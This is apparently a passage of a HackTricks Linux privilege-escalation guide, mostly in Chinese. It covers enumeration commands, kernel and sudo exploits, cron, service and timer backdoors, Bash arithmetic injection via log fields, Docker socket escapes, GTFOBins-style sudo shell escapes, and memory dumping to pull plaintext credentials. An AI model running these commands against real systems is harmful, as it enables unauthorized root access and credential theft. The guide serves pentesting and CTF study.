# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## 系统信息

### 操作系统信息

让我们开始收集一些关于正在运行的操作系统的信息。
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### 路径

如果你**对 `PATH` 变量中任何文件夹具有写权限**，你可能能够劫持某些库或二进制文件：
```bash
echo $PATH
```
### 环境信息

环境变量中是否包含有价值的信息、密码或 API 密钥？
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

检查 kernel 版本，查看是否存在可用于 escalate privileges 的 exploit。
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
你可以在这里找到一个不错的易受攻击的内核列表和一些已经 **compiled exploits**： [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
其他可以找到一些 **compiled exploits** 的网站： [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

要从该网站提取所有易受攻击的内核版本，你可以这样做：
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
可用于查找 kernel exploits 的工具有：

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (在 victim 上执行，仅检查针对 kernel 2.x 的 exploits)

始终 **在 Google 中搜索 kernel 版本**，也许你的 kernel 版本写在某个 kernel exploit 中，这样你就能确认该 exploit 是否有效。

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo 版本

基于出现在以下位置的易受攻击的 sudo 版本：
```bash
searchsploit sudo
```
您可以使用此 grep 检查 sudo 版本是否易受影响。
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

来自 @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg 签名验证失败

检查 **smasher2 box of HTB** 以获取如何利用此 vuln 的 **示例**
```bash
dmesg 2>/dev/null | grep "signature"
```
### 更多系统枚举
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## 枚举可能的防御措施

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

如果你在 docker container 内，你可以尝试 escape：

{{#ref}}
docker-security/
{{#endref}}

## 驱动器

检查 **what is mounted and unmounted**，在哪里以及为什么。如果有任何是 unmounted 的，你可以尝试把它 mount 并检查是否有敏感信息。
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## 有用的软件

枚举有用的二进制文件
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
另外，检查是否安装了 **任何编译器**。如果你需要使用某些 kernel exploit，建议在将要使用它的机器（或类似的机器）上编译它，因此这点很有用。
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### 漏洞软件已安装

检查 **已安装软件包和服务的版本**。可能存在一些旧的 Nagios 版本（例如）可以被利用来进行 escalating privileges…\
建议手动检查更可疑已安装软件的版本。
```bash
dpkg -l #Debian
rpm -qa #Centos
```
如果你有对该机器的 SSH 访问权限，你也可以使用 **openVAS** 来检查机器内已安装的软件是否过时或存在已知漏洞。

> [!NOTE] > _请注意，这些命令会显示大量大多无用的信息，因此建议使用像 OpenVAS 之类的应用来检查已安装软件版本是否容易被已知 exploits 利用。_

## 进程

查看 **正在执行的进程**，并检查是否有任何进程拥有 **超出应有的权限**（例如由 root 执行的 tomcat？）
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

服务器上的某些服务会将 **凭据以明文保存到内存中**。\
通常你将需要 **root privileges** 来读取属于其他用户的进程的内存，因此这通常在你已经是 root 并想发现更多凭据时更有用。\
然而，记住 **作为普通用户你可以读取你所拥有的进程的内存**。

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

例如，如果你能够访问某个 FTP 服务的内存，你可以获取 Heap 并在其中搜索凭据。
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB 脚本
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

对于给定的进程 ID，**maps 显示该进程的虚拟地址空间中内存是如何映射的**；它还显示每个映射区域的**权限**。**mem** 伪文件**暴露了进程的内存本身**。从 **maps** 文件我们可以知道哪些**内存区域是可读的**以及它们的偏移。我们使用这些信息**定位到 mem 文件并将所有可读区域转储**到一个文件。
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` 提供对系统的 **物理** 内存的访问，而不是虚拟内存。内核的虚拟地址空间可以通过 /dev/kmem 访问。\
通常，`/dev/mem` 仅对 **root** 和 **kmem** 组可读。
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump 用于 linux

ProcDump 是对经典 ProcDump 工具的 Linux 重新构想，该工具来自 Sysinternals 的 Windows 工具套件。可在 [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux) 获取。
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### 工具

要转储进程内存，你可以使用：

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_你可以手动移除 root 的要求并转储由你拥有的进程
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (需要 root)

### 进程内存中的凭证

#### 手动示例

如果你发现 authenticator 进程正在运行：
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
你可以 dump the process（参见前面的章节以了解不同的方法来 dump the memory of a process），并在 memory 中搜索 credentials：
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

该工具 [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) 会**从内存中窃取明文凭证**并从一些**已知文件**中获取凭证。它需要 root 权限才能正常工作。

| 功能                                              | 进程名称               |
| ------------------------------------------------- | -------------------- |
| GDM 密码 (Kali Desktop, Debian Desktop)           | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### 搜索正则/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## 定时任务/Cron jobs

检查是否有任何定时任务易受攻击。也许你可以利用一个由 root 执行的脚本（wildcard vuln? 可以修改 root 使用的文件吗? 使用 symlinks? 在 root 使用的目录中创建特定文件?）。
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron 路径

例如，在 _/etc/crontab_ 中你可以找到 PATH： _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_注意 user 用户对 /home/user 有写权限_)

如果在这个 crontab 中 root 尝试执行某个命令或脚本而没有设置 path。例如： _\* \* \* \* root overwrite.sh_\
那么，你可以通过以下方式获得 root shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron 使用包含通配符的脚本 (Wildcard Injection)

如果某个由 root 执行的脚本在命令中包含 “**\***”，你可以利用它导致意外行为（例如 privesc）。示例：
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**如果 wildcard 前面是像** _**/some/path/\***_ **这样的路径，则它不易受影响（即使** _**./\***_ **也不）。**

阅读以下页面以获取更多 wildcard 利用技巧：


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash 在 ((...))、$((...)) 和 let 的算术求值之前，会先进行 parameter expansion 和 command substitution。如果 root 的 cron/parser 读取不受信任的日志字段并将其传入算术上下文，攻击者可以注入 command substitution $(...)，在 cron 运行时以 root 权限执行。

- 为什么可行：在 Bash 中，expansions 的顺序是：parameter/variable expansion、command substitution、arithmetic expansion，然后是 word splitting 和 pathname expansion。所以像 `$(/bin/bash -c 'id > /tmp/pwn')0` 这样的值会先被 substitution（运行命令），然后剩下的数字 `0` 被用于算术运算，脚本因此可以继续而不会报错。

- 典型的易受攻击模式：
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- 利用方法：将可被攻击者控制的文本写入被解析的日志，使看起来像数字的字段包含 command substitution 并以数字结束。确保你的命令不向 stdout 输出（或将其重定向），以使算术运算仍然有效。
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

如果你 **能修改一个 cron script**（由 root 执行），你可以非常容易地获得一个 shell：
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
如果由 root 执行的脚本使用了一个你拥有完全访问权限的 **目录**，那么删除该文件夹并 **创建一个指向另一个的 symlink 文件夹**，用于托管由你控制的脚本，可能会很有用。
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### 频繁的 cron jobs

你可以监视进程以查找每隔 1、2 或 5 分钟执行的进程。也许你可以利用它来提权。

例如，要 **在 1 分钟内每 0.1 秒监视一次**、**按执行次数较少排序** 并删除执行次数最多的命令，你可以这样做：
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**你也可以使用** [**pspy**](https://github.com/DominicBreuker/pspy/releases)（这将监控并列出每个启动的进程）。

### 隐形 cron jobs

可以通过在注释后放置一个回车（没有换行字符）来创建一个 cronjob，cron job 仍然会生效。示例（注意回车字符）：
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## 服务

### 可写的 _.service_ 文件

检查是否可以写入任何 `.service` 文件，如果可以，你**可以修改它**，使其在服务**启动**、**重启**或**停止**时**执行**你的**backdoor**（可能需要等到机器重启）。\
例如在 `.service` 文件中通过 **`ExecStart=/tmp/script.sh`** 创建你的 backdoor

### 可写的服务二进制文件

请记住，如果你对由服务执行的二进制文件拥有**写权限**，你可以修改它们以植入 backdoor，这样当服务被重新执行时，backdoor 也会被执行。

### systemd PATH - 相对路径

你可以通过以下命令查看 **systemd** 使用的 PATH：
```bash
systemctl show-environment
```
如果你发现你可以在该路径的任一文件夹中**写入**，你可能能够**escalate privileges**。你需要在服务配置文件中搜索像下面这样使用**相对路径**的条目：
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
然后，在你可以写入的 systemd PATH 文件夹中创建一个与相对路径二进制同名的 **可执行文件**，当服务被要求执行易受攻击的操作（**Start**, **Stop**, **Reload**）时，你的 **backdoor** 将被执行（非特权用户通常无法启动/停止服务，但请检查是否可以使用 `sudo -l`）。

**Learn more about services with `man systemd.service`.**

## **计时器**

**Timers** 是以 `**.timer**` 结尾的 systemd unit 文件，用于控制 `**.service**` 文件或触发事件。**Timers** 可作为 cron 的替代方案，因为它们对日历时间事件和单调时间事件提供内建支持，并且可以异步运行。

你可以列举所有的定时器：
```bash
systemctl list-timers --all
```
### 可写的计时器

如果你可以修改一个计时器，你就可以让它执行某些 systemd.unit 实例（例如 `.service` 或 `.target`）
```bash
Unit=backdoor.service
```
在文档中你可以读到 Unit 是：

> 当该 timer 到期时要激活的单元。参数是一个单元名称，其后缀不是 ".timer"。如果未指定，该值默认为一个与 timer 单元同名（除后缀外）的 service。（见上文。）建议被激活的单元名称和 timer 单元的单元名称除了后缀外保持一致。

因此，要滥用此权限，你需要：

- 找到某个 systemd unit（例如 `.service`），它正在执行一个 **可写的二进制**
- 找到某个 systemd unit，其正在执行一个 **相对路径**，并且你对 **systemd PATH** 拥有 **写入权限**（以模仿该可执行文件）

**更多关于 timers 的信息请参见 `man systemd.timer`.**

### **启用 Timer**

要启用一个 timer，你需要 root 权限并执行：
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **进程间通信** on the same or different machines within client-server models. They utilize standard Unix descriptor files for inter-computer communication and are set up through `.socket` files.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Inside this file, several interesting parameters can be configured:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: These options are different but a summary is used to **指示将在哪监听** the socket (the path of the AF_UNIX socket file, the IPv4/6 and/or port number to listen, etc.)
- `Accept`: Takes a boolean argument. If **true**, a **service instance is spawned for each incoming connection** and only the connection socket is passed to it. If **false**, all listening sockets themselves are **passed to the started service unit**, and only one service unit is spawned for all connections. This value is ignored for datagram sockets and FIFOs where a single service unit unconditionally handles all incoming traffic. **默认值为 false**。出于性能原因，建议新的 daemon 仅以适合 `Accept=no` 的方式编写。
- `ExecStartPre`, `ExecStartPost`: Takes one or more command lines, which are **executed before** or **after** the listening **sockets**/FIFOs are **created** and bound, respectively. The first token of the command line must be an absolute filename, then followed by arguments for the process.
- `ExecStopPre`, `ExecStopPost`: Additional **commands** that are **executed before** or **after** the listening **sockets**/FIFOs are **closed** and removed, respectively.
- `Service`: Specifies the **service** unit name **to activate** on **incoming traffic**. This setting is only allowed for sockets with Accept=no. It defaults to the service that bears the same name as the socket (with the suffix replaced). In most cases, it should not be necessary to use this option.

### Writable .socket files

If you find a **writable** `.socket` file you can **add** at the beginning of the `[Socket]` section something like: `ExecStartPre=/home/kali/sys/backdoor` and the backdoor will be executed before the socket is created. Therefore, you will **probably need to wait until the machine is rebooted.**\
_注意：系统必须正在使用该 socket 文件的配置，否则 backdoor 不会被执行_

### Writable sockets

If you **identify any writable socket** (_now we are talking about Unix Sockets and not about the config `.socket` files_), then **you can communicate** with that socket and maybe exploit a vulnerability.

### 枚举 Unix Sockets
```bash
netstat -a -p --unix
```
### 原始连接
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

请注意，可能存在一些 **sockets listening for HTTP** 请求（_我不是指 .socket 文件，而是充当 unix sockets 的文件_）。你可以使用以下命令检查：
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
如果该 socket 对 HTTP 请求 **响应**，那么你可以与其 **通信**，并可能 **利用某些漏洞**。

### 可写的 Docker socket

Docker socket（通常位于 `/var/run/docker.sock`）是一个需要加固的关键文件。默认情况下，它对 `root` 用户和 `docker` 组的成员是可写的。拥有对该 socket 的写权限可能导致 privilege escalation。下面是如何做到这一点的分解，以及在无法使用 Docker CLI 时的替代方法。

#### **Privilege Escalation with Docker CLI**

如果你对 Docker socket 有写权限，你可以使用以下命令来 escalate privileges：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个对主机文件系统具有 root 级别访问的 container。

#### **直接使用 Docker API**

在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令来操纵 Docker socket。

1.  **List Docker Images:** 检索可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** 发送请求以创建一个挂载主机根目录的 container。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的 container：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** 使用 `socat` 与 container 建立连接，从而能够在其内执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

在设置好 `socat` 连接后，你可以在 container 中直接执行命令，并以 root 级别访问主机的文件系统。

### Others

注意，如果你对 docker socket 拥有写权限（因为你位于 `docker` 组内）你会有[**更多提升权限的方法**](interesting-groups-linux-pe/index.html#docker-group)。如果 [**docker API 在端口上监听**，你也可能能够攻破它](../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下位置查看有关**更多从 docker 逃逸或滥用它以提升权限的方法**：


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为 **你可能能够滥用它来提升权限**：


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为 **你可能能够滥用它来提升权限**：


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一个复杂的 inter-Process Communication (IPC) 系统，使应用能够高效地互相交互和共享数据。它针对现代 Linux 系统设计，提供了一个在不同形式的应用通信中都很健壮的框架。

该系统用途广泛，支持增强进程间数据交换的基本 IPC，类似于增强的 UNIX domain sockets。此外，它有助于广播事件或信号，促进系统组件之间的无缝集成。例如，来自 Bluetooth daemon 的来电信号可以促使音乐播放器静音，从而提升用户体验。除此之外，D-Bus 还支持远程对象系统，简化了应用之间的服务请求和方法调用，精简了传统上复杂的流程。

D-Bus 基于 allow/deny 模型运作，根据匹配的策略规则的累积效果来管理消息权限（方法调用、信号发送等）。这些策略指定了与 bus 的交互，可能通过利用这些权限导致权限提升。

下面给出了 `/etc/dbus-1/system.d/wpa_supplicant.conf` 中此类策略的示例，说明了 root 用户对 `fi.w1.wpa_supplicant1` 拥有、发送和接收消息的权限。

未指定用户或组的策略适用于所有情况，而 "default" 上下文策略适用于未被其他特定策略覆盖的所有主体。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**在此学习如何 enumerate 和 exploit D-Bus communication：**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

对网络进行 enumerate 并弄清机器的位置总是很有趣。

### 通用 enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

始终检查在你获得访问权限之前无法与之交互的机器上运行的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

检查你是否可以嗅探流量。如果可以，你可能能够获取一些凭证。
```
timeout 1 tcpdump
```
## 用户

### 通用枚举

检查你是谁，拥有哪些 **privileges**，系统中有哪些 **users**，哪些可以 **login**，哪些拥有 **root privileges**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### 大 UID

某些 Linux 版本受一个漏洞影响，该漏洞允许 **UID > INT_MAX** 的用户提升权限。更多信息： [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### 组

检查你是否是某个可能授予你 root 权限的 **组成员**：


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### 剪贴板

检查剪贴板中是否有任何有趣的内容（如果可能）
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

If you **know any password** of the environment **try to login as each user** using the password.

### Su Brute

If don't mind about doing a lot of noise and `su` and `timeout` binaries are present on the computer, you can try to brute-force user using [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) with `-a` parameter also try to brute-force users.

## Writable PATH abuses

### $PATH

If you find that you can **write inside some folder of the $PATH** you may be able to escalate privileges by **creating a backdoor inside the writable folder** with the name of some command that is going to be executed by a different user (root ideally) and that is **not loaded from a folder that is located previous** to your writable folder in $PATH.

### SUDO and SUID

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
某些**意外命令可以让你读取和/或写入文件，甚至执行命令。**例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下以另一个用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在这个例子中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在很容易通过将 ssh key 添加到 root 目录或调用 `sh` 来获得 shell。
```
sudo vim -c '!sh'
```
### SETENV

这个指令允许用户在执行某些操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
这个示例，**based on HTB machine Admirer**，**vulnerable** to **PYTHONPATH hijacking**，可在以 root 身份执行脚本时加载任意 python 库：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV 通过 sudo env_keep 保留 → root shell

如果 sudoers 保留 `BASH_ENV`（例如，`Defaults env_keep+="ENV BASH_ENV"`），你可以利用 Bash 的非交互启动行为，在调用被允许的命令时以 root 身份运行任意代码。

- 为什么它有效：对于非交互式 shell，Bash 会评估 `$BASH_ENV` 并在运行目标脚本之前 source 该文件。许多 sudo 规则允许运行脚本或 shell 包装器。如果 `BASH_ENV` 被 sudo 保留，你的文件会以 root 特权被 source。

